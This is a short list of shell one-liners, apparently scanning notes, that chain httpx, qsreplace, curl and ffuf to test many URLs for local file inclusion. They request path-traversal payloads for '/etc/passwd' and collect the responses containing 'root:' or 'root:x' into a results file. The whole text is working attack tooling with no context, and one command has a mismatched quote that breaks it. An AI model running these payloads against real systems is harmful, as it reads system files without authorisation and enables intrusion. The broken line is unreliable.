cat alive_links | httpx -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' >> lfi_bugs.txt
cat lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"’
for URL in $(cat urls.txt); do (ffuf -u "${URL}" -c -w LFI-Jhaddix.txt -mc 200 -ac -sa -t 20 -or -od ffuf_lfi_results); done
grep -Ril "root:x" ffuf_lfi_results/ | tee LFI_VULNERABLE.txt
cat LFI_VULNERABLE.txt >> lfi_bugs.txt
rm LFI_VULNERABLE.txt ffuf_lfi_results
